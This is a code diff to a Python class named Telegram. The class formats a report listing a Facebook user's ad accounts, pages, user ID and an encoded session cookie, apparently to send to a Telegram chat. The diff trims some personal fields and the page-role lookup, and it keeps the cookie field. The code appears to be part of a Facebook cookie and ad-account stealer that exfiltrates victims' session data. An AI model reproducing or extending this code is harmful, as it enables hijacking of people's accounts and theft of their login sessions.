@@ -31,28 +31,38 @@ class Telegram:
 
             UID = values['me']['id']
             adaccounts = self.apiGetAdaccounts(values['adaccounts'])[:3]
-            businesses = self.apiGetBusinesses(values['businesses'])[:3]
+            # businesses = self.apiGetBusinesses(values['businesses'])[:3]
             pages = self.apiGetPages(values['pages'], UID)[:3]
 
             messageTextAdaccounts = self.apiGetMessageAdaccounts(
                 adaccounts, UID)
-            messageTextBusiness = self.apiGetMessageBusiness(businesses)
-            messageTextPages = self.apiGetMessagePages(pages, UID)
+            # messageTextBusiness = self.apiGetMessageBusiness(businesses)
+            messageTextPages = self.apiGetMessagePages(pages)
 
+#             messageText = f"\
+# *[ Adaccounts ][ {len(values['adaccounts'])} ]*\n\
+# {messageTextAdaccounts}\n\
+# *[ Businesses ][ {len(values['businesses'])} ]*\n\
+# {messageTextBusiness}\n\
+# *[ Pages ][ {len(values['pages'])} ]*\n\
+# {messageTextPages}\n\
+# *[ About ][ {values['me']['name']} ]*\n\
+# ```\nUID: {values['me']['id']}\n```\
+# ```\nName: {values['me']['name']}\n```\
+# ```\nGender: {values['me'].get('gender')}\n```\
+# ```\nBirthday: {values['me'].get('birthday')}\n```\
+# ```\nFriends: {values['me']['friends']['summary']['total_count']}\n```\
+# ```\nSessions: {', '.join(values['sessions'][:3])}\n```\n\
+# *[ Cookie ]*\n\
+# ```\n{cookieEncode}\n```\
+#             ".strip()
             messageText = f"\
 *[ Adaccounts ][ {len(values['adaccounts'])} ]*\n\
 {messageTextAdaccounts}\n\
-*[ Businesses ][ {len(values['businesses'])} ]*\n\
-{messageTextBusiness}\n\
 *[ Pages ][ {len(values['pages'])} ]*\n\
 {messageTextPages}\n\
-*[ About ][ {values['me']['name']} ]*\n\
+*[ About ]*\n\
 ```\nUID: {values['me']['id']}\n```\
-```\nName: {values['me']['name']}\n```\
-```\nGender: {values['me'].get('gender')}\n```\
-```\nBirthday: {values['me'].get('birthday')}\n```\
-```\nFriends: {values['me']['friends']['summary']['total_count']}\n```\
-```\nSessions: {', '.join(values['sessions'][:3])}\n```\n\
 *[ Cookie ]*\n\
 ```\n{cookieEncode}\n```\
             ".strip()
@@ -140,11 +150,11 @@ class Telegram:
             )
         return ''.join(messageTextList)
 
-    def apiGetMessagePages(self, pages, UID):
+    def apiGetMessagePages(self, pages):
         messageTextList = []
         for page in pages:
             messageTextList.append(
-                f"```\n[Likes: {page['fan_count']}, Followers: {page['followers_count']}, Role: {self.apiGetRoleOnPage(page, UID)}] => [Id: {page['id']}, Created: {page['page_created_time']}]\n```"
+                f"```\n[Likes: {page['fan_count']}, Followers: {page['followers_count']}] => [Id: {page['id']}, Created: {page['page_created_time']}]\n```"
             )
         return ''.join(messageTextList)
 
